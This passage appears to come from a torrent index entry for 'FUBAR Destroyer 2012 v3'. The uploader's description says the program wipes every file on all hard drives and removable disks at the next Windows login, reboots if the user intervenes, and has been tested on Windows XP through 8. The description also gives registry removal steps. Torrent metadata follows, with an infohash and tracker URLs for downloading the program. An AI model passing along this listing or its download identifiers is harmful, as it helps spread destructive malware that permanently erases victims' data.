You cannot install it by mistake!\n\nInstallation takes a few seconds. And nothing more happens.\nNext time any user logs into Windows, this program will present the user to a black screen, and delete all files on all harddrives and removable disks.\n\nIf the user clicks anywhere on the screen, or try to terminate the program, Windows will immediately log out, and reboot the computer.\n\nTHE DAMAGE IS PERMANENT!\nYou can, of course, remove this program.\nBut the damage that has already been done, is permanent and cannot be recovered.\n\n\nHere is how to remove it:\n1. Boot up in Safe-Mode.\n2. Open the Registry Editor (regedit.exe).\n3. Browse to this key:\n   HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersion/Run\n4. Delete the value named &quot;FUBAR ShutDown 2012&quot;.\n\n\n\nTested with:\n- Windows XP 32/64bit: OK\n- Windows Vista 32/64bit: OK\n- Windows 7 32/64bit: OK\n- Windows 8 32/64bit: OK\n\n\n\n/Ubehage","torrent":{"xt":"urn:btih:8ffc65fa58b13f9d36f1188e418e47129853206f","amp;dn":"FUBAR+Destroyer+2012+v3","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"8ffc65fa58b13f9d36f1188e418e47129853206f","infoHashBuffer":{"type":"Buffer","data":[143,252,101,250,88,177,63,157,54,241,24,142,65,142,71,18,152,83,32,111]},"announce":[],"urlList":[]}}
